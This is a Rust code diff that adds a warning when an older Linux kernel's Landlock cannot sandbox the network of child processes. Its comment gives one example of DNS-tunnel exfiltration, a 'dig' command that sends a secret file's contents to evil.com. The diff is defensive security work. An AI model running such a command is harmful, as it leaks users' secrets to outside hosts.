@@ -365,6 +365,18 @@ fn inner_build_runtime(
                      详情见 `minicoding doctor --security`（security.md §8）"
                 );
             }
+            // R9 SANDBOX-1：Linux 上 Landlock 网络原语需 ABI≥4（内核 6.7+）——
+            // 旧内核下沙箱子进程 TCP/UDP/DNS 全部开放（DNS 隧道 `dig $(cat
+            // secret).evil.com` 通道保留）。UX-4 的"未硬化"警告不区分网络子项，
+            // 此处显式补充，防用户误以为旧内核上网络也受沙箱约束。
+            #[cfg(target_os = "linux")]
+            if driver.is_hardened() && !minicoding_sandbox::linux::net_restriction_supported() {
+                tracing::warn!(
+                    "Linux 内核不支持 Landlock 网络原语（需 ABI≥4 / 6.7+）：\
+                     沙箱子进程的网络（TCP/UDP/DNS）不受 OS 沙箱约束。\
+                     若需断网隔离，建议升级内核或使用 `--features seccomp` 编译"
+                );
+            }
             Some((driver, policy))
         }
         #[cfg(not(feature = "sandbox"))]
